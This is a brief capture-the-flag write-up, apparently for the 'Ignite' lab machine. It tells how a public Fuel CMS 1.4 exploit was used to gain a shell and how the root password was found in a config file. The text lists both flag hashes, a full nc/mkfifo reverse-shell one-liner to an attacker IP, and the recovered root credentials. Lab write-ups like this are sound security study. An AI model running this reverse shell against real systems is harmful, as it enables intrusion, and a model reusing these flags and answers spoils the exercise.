# IGNITE

## BASIC INFO
```
export IP=10.10.28.21
```

## ROOT IT
> - **User.txt**
>> 6470e394cbf6dab6a91682cc8585059b

Some research on fuel cms v1.4 leads us to a [page](https://www.exploit-db.com/exploits/47138) on exploit-db.\
Using that exploit, changing a few params so that the url is our url and remove `proxies=proxy` in `requests.get()`\
Set up a listener on our machine then execute this command on the prompt from the exploit above.\
`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.8.177 9001 >/tmp/f`\
We're in as www-data.

> - **Root.txt**
>> b9bbcb33e11b80be759c4e844862482d

Look into the index page of fuel. It says that some data are saved in database.php located in fuel/application/config.\
Root password is found. `root:mememe`

![badges](../../../badges/dianchia.png)